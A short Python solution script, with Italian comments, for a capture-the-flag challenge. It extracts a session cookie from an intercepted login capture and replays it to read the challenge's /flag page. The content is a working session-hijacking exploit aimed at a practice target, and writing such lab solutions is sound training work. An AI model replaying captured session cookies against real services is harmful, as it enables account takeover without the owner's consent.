# Siamo riusciti a intercettare un utente durante un login, prova a trovare la flag.

import requests
import pyshark

url = 'http://easylogin.challs.olicyber.it'

# una rapida occhiata al pcap mostra un certo user admin con password uguale
# il totp è 123456 ma ovviamente non è valido per rifare il login
# nelle richieste però è presente un cookie di sessione
# proviamo a usarlo per accedere alla pagina /flag, che viene citata nel pcap

pcap = pyshark.FileCapture('capture.pcapng')
# ovviamente il file deve trovarsi nella dir giusta
# leggiamo il pcap e cerchiamo il cookie di sessione
for packet in pcap:
    try:
        if 'http' in packet and packet.http.cookie: # filtro pacchetti http con cookie
            cookie = str(packet.http.cookie).split('=') # splitto il cookie
    except AttributeError:
        continue

# uso il cookie per fare la richiesta alla pagina /flag
r = requests.get(url + '/flag', cookies={cookie[0]: cookie[1]})
# stampo la risposta
print(r.text.strip())